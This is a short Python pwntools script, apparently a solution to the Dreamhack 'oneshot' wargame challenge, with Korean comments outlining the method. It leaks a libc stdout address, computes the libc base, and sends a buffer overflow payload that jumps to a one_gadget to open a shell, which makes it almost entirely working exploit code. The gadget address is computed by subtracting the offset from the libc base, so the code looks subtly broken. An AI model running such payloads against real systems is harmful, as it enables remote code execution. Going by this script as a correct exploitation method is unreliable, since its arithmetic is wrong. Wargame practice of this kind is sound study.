from pwn import *

#p = remote('host3.dreamhack.games', '23761')
p = process('./oneshot')
e = ELF('./oneshot')
libc = ELF('./libc-2.23.so')

one_gadget = 0xf1247
p.recvuntil(b"stdout: 0x")
stdout = int(p.recv(12), 16)
#print(hex(stdout))

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
print(hex(libc_base))
oneshot = libc_base - one_gadget

payload = b"A" * 0x20 + p64(0) + b"A" * 0x8 + p64(oneshot)

p.send(payload)
p.interactive()


'''
1. got 안에 함수 주소를 LEAK
2. 함수 offset 구하기
3. 1번 주소 - 2번 주소해서 base 찾기
4. 찾은 libc base에 one_gadget으로 /bin/sh 실행

https://she11.tistory.com/140
https://github.com/pwndbg/pwndbg/issues/924
https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html

libc_base 구하는 방법 찾아보기
-> libc database 찾아보기
'''

